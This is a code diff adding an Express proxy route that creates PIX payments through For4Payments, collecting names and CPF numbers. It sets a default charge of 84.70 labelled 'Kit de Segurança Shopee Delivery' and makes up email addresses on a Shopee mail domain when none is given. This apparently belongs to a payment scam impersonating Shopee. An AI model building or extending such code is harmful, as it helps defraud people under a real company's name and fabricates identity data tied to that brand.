@@ -24,6 +24,71 @@ export async function registerRoutes(app: Express): Promise<Server> {
       timestamp: new Date().toISOString()
     });
   });
+  
+  // Rota proxy para For4Payments para evitar CORS
+  app.post('/api/proxy/for4payments/pix', async (req, res) => {
+    try {
+      // Verificar se a API For4Payments está configurada
+      if (!process.env.FOR4PAYMENTS_SECRET_KEY) {
+        console.error('ERRO: FOR4PAYMENTS_SECRET_KEY não configurada');
+        return res.status(500).json({
+          error: 'Serviço de pagamento não configurado. Configure a chave de API For4Payments.',
+        });
+      }
+      
+      console.log('Iniciando proxy para For4Payments...');
+      
+      // Configurar cabeçalhos para a requisição à For4Payments
+      const apiUrl = 'https://app.for4payments.com.br/api/v1/pix/create';
+      const secretKey = process.env.FOR4PAYMENTS_SECRET_KEY;
+      
+      // Processar os dados recebidos
+      const { name, cpf, email, phone, amount = 84.70, description = "Kit de Segurança Shopee Delivery" } = req.body;
+      
+      if (!name || !cpf) {
+        return res.status(400).json({ error: 'Nome e CPF são obrigatórios' });
+      }
+      
+      // Construir payload para a For4Payments
+      const payload = {
+        name,
+        document: cpf.replace(/[^0-9]/g, ''),
+        email: email || `${name.toLowerCase().replace(/\s+/g, '.')}.${Date.now()}@mail.shopee.br`,
+        phone: phone || null,
+        amount: amount,
+        description
+      };
+      
+      console.log('Enviando requisição para For4Payments API via proxy...', {
+        name: payload.name,
+        document: payload.document.substring(0, 3) + '***' + payload.document.substring(payload.document.length - 2)
+      });
+      
+      // Enviar requisição para For4Payments
+      const response = await fetch(apiUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Authorization': `Bearer ${secretKey}`,
+          'Accept': 'application/json'
+        },
+        body: JSON.stringify(payload)
+      });
+      
+      // Processar resposta
+      const result = await response.json();
+      
+      console.log('Resposta da For4Payments recebida pelo proxy');
+      
+      // Retornar resposta para o cliente
+      return res.status(response.status).json(result);
+    } catch (error: any) {
+      console.error('Erro no proxy For4Payments:', error);
+      return res.status(500).json({ 
+        error: error.message || 'Falha ao processar pagamento pelo proxy'
+      });
+    }
+  });
   // Rota para obter todos os estados
   app.get('/api/states', async (req, res) => {
     try {
